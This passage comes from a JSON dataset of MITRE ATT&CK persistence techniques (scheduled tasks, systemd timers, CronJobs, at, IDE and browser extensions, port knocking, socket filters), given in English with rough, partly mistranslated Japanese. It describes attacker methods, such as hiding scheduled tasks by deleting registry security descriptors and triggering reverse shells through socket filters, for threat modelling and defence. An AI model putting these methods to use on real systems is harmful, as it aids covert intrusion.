                        "description_eng": "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The [schtasks](https://attack.mitre.org/software/S0111) utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel.(Citation: Stack Overflow) In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) (WMI) to create a scheduled task. Adversaries may also utilize the Powershell Cmdlet `Invoke-CimMethod`, which leverages WMI class `PS_ScheduledTask` to create a scheduled task via an XML path.(Citation: Red Canary - Atomic Red Team)\n\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.(Citation: ProofPoint Serpent)\n\nAdversaries may also create \"hidden\" scheduled tasks (i.e. [Hide Artifacts](https://attack.mitre.org/techniques/T1564)) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from `schtasks /query` and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions).(Citation: SigmaHQ)(Citation: Tarrask scheduled task) Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., `Index` value) within associated registry keys.(Citation: Defending Against Scheduled Task Attacks in Windows Environments)",
                        "description_jp": "攻撃者はWindowsタスクスケジューラを悪用し、悪意のあるコードを初回または繰り返し実行するためのタスクスケジューリングを実行する可能性がある。Windowsのタスクスケジューラーにアクセスする方法は複数ある。schtasks](https://attack.mitre.org/software/S0111)ユーティリティは、コマンドラインで直接実行することができ、タスクスケジューラは、コントロールパネルの管理者ツールセクション内のGUIを介して開くことができます(引用: Stack Overflow)いくつかのケースでは、敵対者は、Windowsタスクスケジューラのための.NETラッパーを使用しており、代わりに、敵対者は、スケジュールされたタスクを作成するためにWindows netapi32ライブラリと[Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)(WMI)を使用しています。敵はまた、XMLパスを介してスケジュールされたタスクを作成するために、WMIクラス`PS_ScheduledTask`を活用するPowershell Cmdlet `Invoke-CimMethod`を利用するかもしれない(引用: Red Canary - Atomic Red Team)。\n\n敵対者は Windows タスク・スケジューラを使用して、システム起動時または永続化のためにスケジュールされたベース でプログラムを実行する可能性がある。Windows タスクスケジューラは、横移動の一部としてリモート実行を行ったり、指定されたアカウント(SYSTEM など)のコンテキスト下でプロセスを実行したりするために悪用される可能性もあります。System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218)と同様に、敵対者は Windows タスクスケジューラーを悪用して、署名された/信頼されたシステムプロセスの下で 1 回限りの実行をマスクする可能性もあります。\n\n敵対者はまた、防御ツールやタスクの列挙に使用される手動クエリには見えない「隠された」スケジュールタスク(すなわち[Hide Artifacts](https://attack.mitre.org/techniques/T1564))を作成する可能性があります。具体的には、敵は関連するセキュリティ記述子(SD)のレジストリ値を削除することで、`schtasks /query`とタスクスケジューラからタスクを隠すことができる(この値の削除はSYSTEM権限を使用して完了しなければならない)(引用：SigmaHQ)(引用：Tarraskスケジュールタスク) 敵はまた、関連するレジストリキー内のメタデータ(例えば、`Index`値)を変更するような、タスクを隠すための別の方法を採用することができる(引用：Defending Against Scheduled Task Attacks in Windows Environments)。"
                    },
                    {
                        "id": "T1053.006",
                        "name_eng": "Systemd Timers",
                        "name_jp": "Systemd タイマー",
                        "description_eng": "Adversaries may abuse systemd timers to perform task scheduling for initial or recurring execution of malicious code. Systemd timers are unit files with file extension <code>.timer</code> that control services. Timers can be set to run on a calendar event or after a time span relative to a starting point. They can be used as an alternative to [Cron](https://attack.mitre.org/techniques/T1053/003) in Linux environments.(Citation: archlinux Systemd Timers Aug 2020) Systemd timers may be activated remotely via the <code>systemctl</code> command line utility, which operates over [SSH](https://attack.mitre.org/techniques/T1021/004).(Citation: Systemd Remote Control)\n\nEach <code>.timer</code> file must have a corresponding <code>.service</code> file with the same name, e.g., <code>example.timer</code> and <code>example.service</code>. <code>.service</code> files are [Systemd Service](https://attack.mitre.org/techniques/T1543/002) unit files that are managed by the systemd system and service manager.(Citation: Linux man-pages: systemd January 2014) Privileged timers are written to <code>/etc/systemd/system/</code> and <code>/usr/lib/systemd/system</code> while user level are written to <code>~/.config/systemd/user/</code>.\n\nAn adversary may use systemd timers to execute malicious code at system startup or on a scheduled basis for persistence.(Citation: Arch Linux Package Systemd Compromise BleepingComputer 10JUL2018)(Citation: gist Arch package compromise 10JUL2018)(Citation: acroread package compromised Arch Linux Mail 8JUL2018) Timers installed using privileged paths may be used to maintain root level persistence. Adversaries may also install user level timers to achieve user level persistence.(Citation: Falcon Sandbox smp: 28553b3a9d)",
                        "description_jp": "攻撃者は systemd タイマーを悪用して、悪意のあるコードを初期または繰り返し実行するためのタスクスケジューリングを行う可能性があります。Systemd タイマーは <code>.timer</code> という拡張子を持つユニットファイルで、サービスを制御します。タイマーはカレンダーのイベントや、開始点からの相対的な時間経過後に実行されるように設定できます。Linux 環境では、[Cron](https://attack.mitre.org/techniques/T1053/003) の代替として使うことができます。(引用: archlinux Systemd Timers Aug 2020) Systemd タイマーは、[SSH](https://attack.mitre.org/techniques/T1021/004) 経由で動作する <code>systemctl</code> コマンドラインユーティリティを使ってリモートで起動することができます。(引用: Systemd Remote Control)\n\n各 <code>.timer</code> ファイルには、対応する同じ名前の <code>.service</code> ファイルが必要です。例えば、<code>example.timer</code> と <code>example.service</code> のようになります。<code>.service</code>ファイルは[Systemd Service](https://attack.mitre.org/techniques/T1543/002)ユニットファイルで、systemdシステムとサービスマネージャーによって管理されます。(引用: Linux man-pages: systemd January 2014) 特権タイマーは<code>/etc/systemd/system/</code>と<code>/usr/lib/systemd/system</code>に、ユーザーレベルは<code>~/.config/systemd/user/</code>に書き込まれます。\n\n敵対者は systemd タイマーを使ってシステム起動時やスケジュールベースで悪意のあるコードを実行し、永続化する可能性があります。(引用: Arch Linux Package Systemd Compromise BleepingComputer 10JUL2018)(Citation: gist Arch package compromise 10JUL2018)(Citation: acroread package compromised Arch Linux Mail 8JUL2018) 特権パスを使ってインストールされたタイマーはルートレベルの永続化を維持するために使われるかもしれません。攻撃者はまた、ユーザーレベルの持続性を達成するためにユーザーレベルのタイマーをインストールする可能性があります。(引用: Falcon Sandbox smp: 28553b3a9d)"
                    },
                    {
                        "id": "T1053.007",
                        "name_eng": "Container Orchestration Job",
                        "name_jp": "コンテナ・オーケストレーションジョブ",
                        "description_eng": "Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.\n\nIn Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks.(Citation: Kubernetes Jobs)(Citation: Kubernetes CronJob) An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster.(Citation: Threat Matrix for Kubernetes)",
                        "description_jp": "攻撃者は、Kubernetesなどのコンテナオーケストレーションツールが提供するタスクスケジューリング機能を悪用して、悪意のあるコードを実行するように設定されたコンテナのデプロイをスケジュールする可能性があります。コンテナオーケストレーションジョブは、Linuxシステムのcronジョブと同様に、特定の日時にこれらの自動タスクを実行します。この種のデプロイは、長期にわたってコンテナの量を維持するように構成することもでき、クラスタ内の永続性を維持するプロセスを自動化することができます。\n\nKubernetesでは、CronJobは、特定のタスクを実行するために1つまたは複数のコンテナを実行するJobをスケジュールするために使用されることがあります（引用：Kubernetes Jobs）（引用：Kubernetes CronJob）したがって、敵対者は、クラスタ内のさまざまなノードで悪意のあるコードを実行するJobのデプロイをスケジュールするためにCronJobを利用する可能性があります（引用：Threat Matrix for Kubernetes）。"
                    },
                    {
                        "id": "T1053.002",
                        "name_eng": "At",
                        "name_jp": "At",
                        "description_eng": "Adversaries may abuse the [at](https://attack.mitre.org/software/S0110) utility to perform task scheduling for initial or recurring execution of malicious code. The [at](https://attack.mitre.org/software/S0110) utility exists as an executable within Windows, Linux, and macOS for scheduling tasks at a specified time and date. Although deprecated in favor of [Scheduled Task](https://attack.mitre.org/techniques/T1053/005)'s [schtasks](https://attack.mitre.org/software/S0111) in Windows environments, using [at](https://attack.mitre.org/software/S0110) requires that the Task Scheduler service be running, and the user to be logged on as a member of the local Administrators group. In addition to explicitly running the `at` command, adversaries may also schedule a task with [at](https://attack.mitre.org/software/S0110) by directly leveraging the [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) `Win32_ScheduledJob` WMI class.(Citation: Malicious Life by Cybereason)\n\nOn Linux and macOS, [at](https://attack.mitre.org/software/S0110) may be invoked by the superuser as well as any users added to the <code>at.allow</code> file. If the <code>at.allow</code> file does not exist, the <code>at.deny</code> file is checked. Every username not listed in <code>at.deny</code> is allowed to invoke [at](https://attack.mitre.org/software/S0110). If the <code>at.deny</code> exists and is empty, global use of [at](https://attack.mitre.org/software/S0110) is permitted. If neither file exists (which is often the baseline) only the superuser is allowed to use [at](https://attack.mitre.org/software/S0110).(Citation: Linux at)\n\nAdversaries may use [at](https://attack.mitre.org/software/S0110) to execute programs at system startup or on a scheduled basis for [Persistence](https://attack.mitre.org/tactics/TA0003). [at](https://attack.mitre.org/software/S0110) can also be abused to conduct remote [Execution](https://attack.mitre.org/tactics/TA0002) as part of [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or to run a process under the context of a specified account (such as SYSTEM).\n\nIn Linux environments, adversaries may also abuse [at](https://attack.mitre.org/software/S0110) to break out of restricted environments by using a task to spawn an interactive system shell or to run system commands. Similarly, [at](https://attack.mitre.org/software/S0110) may also be used for [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) if the binary is allowed to run as superuser via <code>sudo</code>.(Citation: GTFObins at)",
                        "description_jp": "攻撃者は[at](https://attack.mitre.org/software/S0110)ユーティリティを悪用して、悪意のあるコードを初回または繰り返し実行するためのタスクスケジューリングを実行する可能性があります。at](https://attack.mitre.org/software/S0110)ユーティリティは、Windows、Linux、および macOS 内に実行可能ファイルとして存在し、指定した日時にタスクをスケジューリングします。Windows環境では[Scheduled Task](https://attack.mitre.org/techniques/T1053/005)の[schtasks](https://attack.mitre.org/software/S0111)に取って代わられ、非推奨となっていますが、[at](https://attack.mitre.org/software/S0110)を使用するには、タスクスケジューラサービスが起動しており、ユーザがローカルのAdministratorsグループのメンバーとしてログオンしている必要があります。明示的に `at` コマンドを実行するだけでなく、[Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) の `Win32_ScheduledJob` WMI クラスを直接利用して、[at](https://attack.mitre.org/software/S0110) でタスクをスケジュールすることもできる。(引用：Malicious Life by Cybereason)\n\nLinuxとmacOSでは、[at](https://attack.mitre.org/software/S0110)は<code>at.allow</code>ファイルに追加されたユーザーだけでなく、スーパーユーザーからも呼び出される可能性があります。<code>at.allow</code>ファイルが存在しない場合、<code>at.deny</code>ファイルがチェックされる。<code>at.deny</code>にリストされていないすべてのユーザー名は、[at](https://attack.mitre.org/software/S0110)の起動を許可される。<code>at.deny<//code>が存在し、空であれば、[at](https://attack.mitre.org/software/S0110)のグローバルな使用が許可される。どちらのファイルも存在しない場合(これがベースラインであることが多い)、スーパーユーザーだけが[at](https://attack.mitre.org/software/S0110)の使用を許可される。(引用: Linux at)\n\n攻撃者は[at](https://attack.mitre.org/software/S0110)を使用して、システム起動時または[Persistence](https://attack.mitre.org/tactics/TA0003)のスケジュールベースでプログラムを実行することができる。[at](https://attack.mitre.org/software/S0110)はまた、[Lateral Movement](https://attack.mitre.org/tactics/TA0008)の一部としてリモートで[Execution](https://attack.mitre.org/tactics/TA0002)を実行したり、指定されたアカウント(SYSTEMなど)のコンテキストでプロセスを実行するために悪用される可能性があります。\n\nLinux 環境では、タスクを使って対話的なシステムシェルを起動したり、システムコマンドを実行したりすることで、制限された環境から抜け出すために [at](https://attack.mitre.org/software/S0110) を悪用することもできる。同様に、[at](https://attack.mitre.org/software/S0110) は、バイナリが <code>sudo</code> 経由でスーパーユーザーとして実行されることが許可されている場合、[特権の昇格](https://attack.mitre.org/tactics/TA0004) にも使用される可能性がある。(引用: GTFObins at)"
                    }
                ]
            },
            {
                "id": "T1176",
                "name_eng": "Software Extensions",
                "name_jp": "ソフトウェア拡張",
                "description_eng": "Adversaries may abuse software extensions to establish persistent access to victim systems. Software extensions are modular components that enhance or customize the functionality of software applications, including web browsers, Integrated Development Environments (IDEs), and other platforms.(Citation: Chrome Extension C2 Malware)(Citation: Abramovsky VSCode Security) Extensions are typically installed via official marketplaces, app stores, or manually loaded by users, and they often inherit the permissions and access levels of the host application. \n\n  \nMalicious extensions can be introduced through various methods, including social engineering, compromised marketplaces, or direct installation by users or by adversaries who have already gained access to a system. Malicious extensions can be named similarly or identically to benign extensions in marketplaces. Security mechanisms in extension marketplaces may be insufficient to detect malicious components, allowing adversaries to bypass automated scanners or exploit trust established during the installation process. Adversaries may also abuse benign extensions to achieve their objectives, such as using legitimate functionality to tunnel data or bypass security controls. \n\nThe modular nature of extensions and their integration with host applications make them an attractive target for adversaries seeking to exploit trusted software ecosystems. Detection can be challenging due to the inherent trust placed in extensions during installation and their ability to blend into normal application workflows.",
                "description_jp": "攻撃者は、ソフトウェア拡張機能を悪用して、被害者のシステムへの永続的なアクセスを確立する可能性があります。ソフトウェア拡張機能とは、ウェブブラウザ、統合開発環境（IDE）、その他のプラットフォームを含むソフトウェアアプリケーションの機能を拡張またはカスタマイズするモジュールコンポーネントです（引用：Chrome Extension C2 Malware）（引用：Abramovsky VSCode Security）拡張機能は通常、公式マーケットプレイスやアプリストア経由でインストールされるか、ユーザーによって手動でロードされます。\n\n  \n悪意のある拡張機能は、ソーシャルエンジニアリング、侵害されたマーケットプレイス、ユーザーによる直接のインストール、すでにシステムにアクセスした敵によるインストールなど、さまざまな方法で導入される可能性があります。悪意のある拡張は、マーケットプレイスにおける良性の拡張と類似した、あるいは同じような名前が付けられる。拡張機能マーケットプレイスのセキュリティメカニズムは、悪意のあるコンポーネントを検出するには不十分である可能性があり、敵対者は自動化されたスキャナを迂回したり、インストールプロセス中に確立された信頼を悪用したりすることができる。敵対者はまた、合法的な機能を使用してデータをトンネリングしたり、セキュリティ制御をバイパスしたりするなど、目的を達成するために良性の拡張機能を悪用する可能性もある。\n\n拡張機能のモジュール的な性質とホストアプリケーションとの統合は、信頼されたソフトウェアエコシステムを悪用しようとする敵対者にとって魅力的なターゲットとなる。インストール時にエクステンションに寄せられる固有の信頼と、通常のアプリケーションのワークフローに溶け込むエクステンションの能力により、検出は困難となる可能性がある。",
                "subtechniques": [
                    {
                        "id": "T1176.002",
                        "name_eng": "IDE Extensions",
                        "name_jp": "IDE拡張機能",
                        "description_eng": "Adversaries may abuse an integrated development environment (IDE) extension to establish persistent access to victim systems.(Citation: Mnemonic misuse visual studio) IDEs such as Visual Studio Code, IntelliJ IDEA, and Eclipse support extensions - software components that add features like code linting, auto-completion, task automation, or integration with tools like Git and Docker. A malicious extension can be installed through an extension marketplace (i.e., [Compromise Software Dependencies and Development Tools](https://attack.mitre.org/techniques/T1195/001)) or side-loaded directly into the IDE.(Citation: Abramovsky VSCode Security)(Citation: Lakshmanan Visual Studio Marketplace)   \n\nIn addition to installing malicious extensions, adversaries may also leverage benign ones. For example, adversaries may establish persistent SSH tunnels via the use of the VSCode Remote SSH extension (i.e., [IDE Tunneling](https://attack.mitre.org/techniques/T1219/001)).  \n\nTrust is typically established through the installation process; once installed, the malicious extension is run every time that the IDE is launched. The extension can then be used to execute arbitrary code, establish a backdoor, mine cryptocurrency, or exfiltrate data.(Citation: ExtensionTotal VSCode Extensions  2025)",
                        "description_jp": "攻撃者は、統合開発環境（IDE）の拡張機能を悪用して、被害者のシステムへの永続的なアクセスを確立する可能性があります（引用：Mnemonic misuse visual studio）Visual Studio Code、IntelliJ IDEA、EclipseなどのIDEは、拡張機能（コードリンティング、自動補完、タスク自動化、GitやDockerなどのツールとの統合などの機能を追加するソフトウェアコンポーネント）をサポートしています。悪意のある拡張機能は、拡張機能マーケットプレイス（[Compromise Software Dependencies and Development Tools](https://attack.mitre.org/techniques/T1195/001)など）を通じてインストールしたり、IDEに直接サイドロードしたりすることができます（引用：Abramovsky VSCode Security）（引用：Lakshmanan Visual Studio Marketplace）。\n\n敵対者は、悪意のある拡張機能をインストールするだけでなく、良性の拡張機能を利用することもあります。例えば、敵対者は VSCode Remote SSH 拡張機能(すなわち、[IDE Tunneling](https://attack.mitre.org/techniques/T1219/001))を使用することで、持続的な SSH トンネルを確立することができます。  \n\n一度インストールされると、IDE を起動するたびに悪意のある拡張機能が実行されます。この拡張機能を使用して、任意のコードを実行したり、バックドアを設置したり、暗号通貨を採掘したり、データを流出させたりすることができます（引用：ExtensionTotal VSCode Extensions 2025）。"
                    },
                    {
                        "id": "T1176.001",
                        "name_eng": "Browser Extensions",
                        "name_jp": "ブラウザ拡張機能",
                        "description_eng": "Adversaries may abuse internet browser extensions to establish persistent access to victim systems. Browser extensions or plugins are small programs that can add functionality to and customize aspects of internet browsers. They can be installed directly via a local file or custom URL or through a browser's app store - an official online platform where users can browse, install, and manage extensions for a specific web browser. Extensions generally inherit the web browser's permissions previously granted.(Citation: Wikipedia Browser Extension)(Citation: Chrome Extensions Definition) \n \nMalicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores, so it may not be difficult for malicious extensions to defeat automated scanners.(Citation: Malicious Chrome Extension Numbers) Depending on the browser, adversaries may also manipulate an extension's update url to install updates from an adversary-controlled server or manipulate the mobile configuration file to silently install additional extensions. \n  \nPrevious to macOS 11, adversaries could silently install browser extensions via the command line using the <code>profiles</code> tool to install malicious <code>.mobileconfig</code> files. In macOS 11+, the use of the <code>profiles</code> tool can no longer install configuration profiles; however, <code>.mobileconfig</code> files can be planted and installed with user interaction.(Citation: xorrior chrome extensions macOS) \n \nOnce the extension is installed, it can browse to websites in the background, steal all information that a user enters into a browser (including credentials), and be used as an installer for a RAT for persistence.(Citation: Chrome Extension Crypto Miner)(Citation: ICEBRG Chrome Extensions)(Citation: Banker Google Chrome Extension Steals Creds)(Citation: Catch All Chrome Extension) \n\nThere have also been instances of botnets using a persistent backdoor through malicious Chrome extensions for [Command and Control](https://attack.mitre.org/tactics/TA0011).(Citation: Stantinko Botnet)(Citation: Chrome Extension C2 Malware) Adversaries may also use browser extensions to modify browser permissions and components, privacy settings, and other security controls for [Defense Evasion](https://attack.mitre.org/tactics/TA0005).(Citation: Browers FriarFox)(Citation: Browser Adrozek)",
                        "description_jp": "攻撃者は、インターネットブラウザの拡張機能を悪用して、被害者のシステムへの永続的なアクセスを確立する可能性があります。ブラウザの拡張機能またはプラグインは、インターネットブラウザの機能を追加したりカスタマイズしたりするための小さなプログラムです。ローカルファイルやカスタムURLを介して直接インストールすることも、ブラウザのアプリストア（ユーザーが特定のウェブブラウザの拡張機能を閲覧、インストール、管理できる公式オンラインプラットフォーム）を介してインストールすることもできます。拡張機能は一般的に、以前に付与されたウェブブラウザの権限を継承する。 引用：Wikipedia ブラウザ拡張機能）（引用：Chrome 拡張機能の定義\n \n悪意のある拡張機能は、正規の拡張機能を装った悪意のあるアプリストアのダウンロード、ソーシャルエンジニアリング、またはすでにシステムに侵入している敵によって、ブラウザにインストールされる可能性があります。ブラウザのアプリストアのセキュリティは制限されている可能性があるため、悪意のある拡張機能が自動スキャナーを打ち負かすことは難しいことではありません。 (引用: 悪意のあるChrome拡張機能の数) ブラウザによっては、敵対者は拡張機能の更新URLを操作して、敵対者が管理するサーバーから更新をインストールしたり、モバイル設定ファイルを操作して、追加の拡張機能をサイレントインストールしたりする可能性もあります。\n  \nmacOS 11 より前のバージョンでは、悪意のある <code>.mobileconfig</code> ファイルをインストールする <code>profiles</code> ツールを使用して、コマンドライン経由でブラウザ拡張機能をサイレント インストールすることができました。macOS 11+ では、<code>profiles</code> ツールを使用してコンフィギュレーション・プロファイルをインストールすることはできなくなった。しかし、<code>.mobileconfig</code> ファイルは、ユーザーの操作によって植え付けられ、インストールされる。(引用：xorrior chrome extensions macOS)\n \n拡張機能がインストールされると、バックグラウンドでウェブサイトを閲覧し、ユーザーがブラウザに入力したすべての情報（認証情報を含む）を盗み出し、RATのインストーラーとして永続的に使用することができる(引用：Chrome Extension Crypto Miner)(引用：ICEBRG Chrome Extensions)(引用：Banker Google Chrome Extension Steals Creds)(引用：Catch All Chrome Extension)\n\nまた、ボットネットが[Command and Control](https://attack.mitre.org/tactics/TA0011)のために悪意のあるChrome拡張機能を介して永続的なバックドアを使用する例もあります。(引用: Stantinko Botnet)(Citation: Chrome Extension C2 Malware) 敵対者はまた、[Defense Evasion](https://attack.mitre.org/tactics/TA0005)のためにブラウザの権限やコンポーネント、プライバシー設定、その他のセキュリティ制御を変更するためにブラウザ拡張機能を使用することもあります。(引用: Browers FriarFox)(Citation: Browser Adrozek)"
                    }
                ]
            },
            {
                "id": "T1205",
                "name_eng": "Traffic Signaling",
                "name_jp": "交通信号",
                "description_eng": "Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. [Port Knocking](https://attack.mitre.org/techniques/T1205/001)), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.\n\nAdversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s).\n\nThe observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.\n\nOn network devices, adversaries may use crafted packets to enable [Network Device Authentication](https://attack.mitre.org/techniques/T1556/004) for standard services offered by the device such as telnet.  Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities.  Adversaries may use crafted packets to attempt to connect to one or more (open or closed) ports, but may also attempt to connect to a router interface, broadcast, and network address IP on the same port in order to achieve their goals and objectives.(Citation: Cisco Synful Knock Evolution)(Citation: Mandiant - Synful Knock)(Citation: Cisco Blog Legacy Device Attacks)  To enable this traffic signaling on embedded devices, adversaries must first achieve and leverage [Patch System Image](https://attack.mitre.org/techniques/T1601/001) due to the monolithic nature of the architecture.\n\nAdversaries may also use the Wake-on-LAN feature to turn on powered off systems. Wake-on-LAN is a hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it. Once the system is powered on, it may become a target for lateral movement.(Citation: Bleeping Computer - Ryuk WoL)(Citation: AMD Magic Packet)",
                "description_jp": "攻撃者はトラフィック・シグナリングを使用して、オープン・ポートや、永続化やコマンド・アンド・コントロールに使用されるその他の悪意のある機能を隠すことができる。トラフィック・シグナリングには、閉じたポートを開いたり、悪意のあるタスクを実行したりするような特別な応答をトリガーするために、システムに送信しなければならないマジック値やシーケンスを使用することが含まれます。これは、敵がコマンド・アンド・コントロールに使用できるポートを開く前に、特定の特性を持つ一連のパケットを送信するという形を取ることがあります。通常、この一連のパケットは、事前に定義された一連のクローズドポートへの接続の試み（すなわち[ポートノッキング](https://attack.mitre.org/techniques/T1205/001)）から構成されるが、通常とは異なるフラグ、特定の文字列、または他のユニークな特徴を含むことができる。シーケンスが完了した後、ポートの開放はホストベースのファイアウォールによって達成されるかもしれないが、カスタムソフトウェアによって実装される可能性もある。\n\n攻撃者は既に開いているポートと通信することもできるが、そのポートをリッスンしているサービスは、適切なマジック値を渡された場合にのみ、コマンドに応答したり、他の悪意のある機能を起動したりする。\n\n通信のトリガーとなるシグナルパケットの観測は、様々な方法で行うことができる。一つは、Cd00r（引用：Hartrell cd00r 2002）によって実装されたもので、libpcapライブラリを使用して問題のパケットをスニッフする方法である。もう1つの方法は生ソケットを利用するもので、これによりマルウェアは、他のプログラムが使用するためにすでに開いているポートを使用することができる。\n\nネットワーク・デバイスの場合、敵は細工したパケットを使って、telnetなどデバイスが提供する標準的なサービスの[Network Device Authentication](https://attack.mitre.org/techniques/T1556/004)を有効にすることがあります。  このようなシグナリングは、telnet などの閉じたサービス・ポートを開くため、またはデバイス上のマルウェアのインプラントのモジュール修正をトリガーし、悪意のある機能を追加、削除、または変更するためにも使用される可能性があります。  攻撃者は、細工したパケットを使用して、1つ以上の（オープンまたはクローズされた）ポートへの接続を試みますが、目的や目標を達成するために、同じポート上のルータインターフェース、ブロードキャスト、ネットワークアドレス IP への接続を試みることもあります。(引用：Cisco Synful Knock Evolution)(引用：Mandiant - Synful Knock)(引用：Cisco Blog Legacy Device Attacks) 組み込みデバイス上でこのトラフィックシグナリングを有効にするには、アーキテクチャがモノリシックであるため、敵対者はまず[Patch System Image](https://attack.mitre.org/techniques/T1601/001)を達成し、活用する必要があります。\n\n敵はまた、電源の切れたシステムをオンにするために Wake-on-LAN 機能を使うかもしれません。Wake-on-LAN はハードウェアの機能で、電源が落ちているシステムにマジックパケットを送ることで、電源を入れたり、起動させたりすることができます。一度電源が入ったシステムは、横移動の標的になる可能性がある。 (引用：Bleeping Computer - Ryuk WoL)(Citation: AMD Magic Packet)",
                "subtechniques": [
                    {
                        "id": "T1205.001",
                        "name_eng": "Port Knocking",
                        "name_jp": "ポートノッキング",
                        "description_eng": "Adversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.\n\nThis technique has been observed both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.\n\nThe observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.",
                        "description_jp": "攻撃者は、ポート・ノッキングを使用して、永続化またはコマンド・アンド・コントロールに使用されるオープン・ポートを隠すことができる。ポートを有効にするために、敵はあらかじめ定義された一連のクローズド・ポートに一連の接続試行を送信します。このシーケンスが完了した後、ポートの開放は多くの場合ホストベースのファイアウォールによって達成されますが、カスタムソフトウェアによって実装されることもあります。\n\nこのテクニックは、リッスンしているポートの動的な開放と、別のシステム上のリッスンしているサーバへの接続の開始の両方で観察されている。\n\n通信のトリガーとなるシグナルパケットの観測は、さまざまな方法で行うことができる。一つは、Cd00r（引用：Hartrell cd00r 2002）によって実装されたもので、libpcapライブラリを使用して問題のパケットをスニッフする方法である。もう1つの方法は生ソケットを利用するもので、これによりマルウェアは、他のプログラムが使用するためにすでに開いているポートを使用することができる。"
                    },
                    {
                        "id": "T1205.002",
                        "name_eng": "Socket Filters",
                        "name_jp": "ソケットフィルター",
                        "description_eng": "Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as the `libpcap` library to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell.\n\nTo establish a connection, an adversary sends a crafted packet to the targeted host that matches the installed filter criteria.(Citation: haking9 libpcap network sniffing) Adversaries have used these socket filters to trigger the installation of implants, conduct ping backs, and to invoke command shells. Communication with these socket filters may also be used in conjunction with [Protocol Tunneling](https://attack.mitre.org/techniques/T1572).(Citation: exatrack bpf filters passive backdoors)(Citation: Leonardo Turla Penquin May 2020)\n\nFilters can be installed on any Unix-like platform with `libpcap` installed or on Windows hosts using `Winpcap`.  Adversaries may use either `libpcap` with `pcap_setfilter` or the standard library function `setsockopt` with `SO_ATTACH_FILTER` options. Since the socket connection is not active until the packet is received, this behavior may be difficult to detect due to the lack of activity on a host, low CPU overhead, and limited visibility into raw socket usage.",
                        "description_jp": "敵はネットワークソケットにフィルタを取り付けて監視し、永続化やコマンド＆コントロールに使われるバックドアを起動することができる。高いパーミッションがあれば、敵は `libpcap` ライブラリのような機能を使ってソケットを開き、特定のタイプのデータがソケットを通過するのを許可したり、許可しなかったりするフィルタをインストールすることができる。フィルタは、指定されたネットワークインターフェース（指定されていない場合はすべてのインターフェース）を通過するすべてのトラフィックに適用される。ネットワークインターフェイスがフィルター条件にマッチするパケットを受信すると、ホスト上でリバースシェルの起動などの追加アクションをトリガーすることができる。\n\n接続を確立するために、敵はインストールされたフィルタ条件に一致する細工されたパケットをターゲットホストに送信する(引用: haking9 libpcap network sniffing)。これらのソケットフィルタによる通信は、[Protocol Tunneling](https://attack.mitre.org/techniques/T1572)と組み合わせて使用されることもあります。(引用：exatrack bpf filters passive backdoors)(Citation: Leonardo Turla Penquin May 2020)\n\nフィルタは `libpcap` がインストールされている Unix 系プラットフォーム、または `Winpcap` を使用している Windows ホストにインストールすることができる。  攻撃者は `pcap_setfilter` オプションを持つ `libpcap` か、`SO_ATTACH_FILTER` オプションを持つ標準ライブラリ関数 `setsockopt` を使用する。ソケット接続はパケットを受信するまでアクティブにならないので、ホスト上のアクティビティが少ないこと、CPU オーバーヘッドが少ないこと、生のソケットの使用状況が限定的であることから、この振る舞いを検出するのは難しいかもしれない。"
                    }
                ]
            },
            {
                "id": "T1525",
